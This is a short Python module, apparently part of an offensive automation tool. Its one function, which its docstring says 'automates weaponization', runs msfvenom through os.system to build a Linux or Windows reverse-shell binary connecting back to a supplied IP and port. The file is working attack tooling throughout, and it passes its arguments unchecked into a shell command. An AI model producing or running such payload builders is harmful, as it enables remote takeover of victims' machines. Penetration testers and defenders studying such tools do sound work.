import os
from core.brain import log

def generate_payload(ip, port, platform="linux"):
    """
    Automates weaponization by creating a reverse shell binary.
    """
    os.makedirs("payloads/shells", exist_ok=True) # Ensure storage exists

    if platform == "linux":
        filename = "payloads/shells/shell.elf"
        payload = "linux/x64/shell_reverse_tcp"
    else:
        filename = "payloads/shells/shell.exe"
        payload = "windows/x64/shell_reverse_tcp"

    print(f"[*] Weaponizing: Building {payload} for {ip}:{port}...")

    # Command to run MSFVenom
    cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {filename.split('.')[-1]} > {filename} 2>/dev/null"

    os.system(cmd)
    log(f"Payload Created: {filename}")
    print(f"[+] Dinger ready at: {filename}")
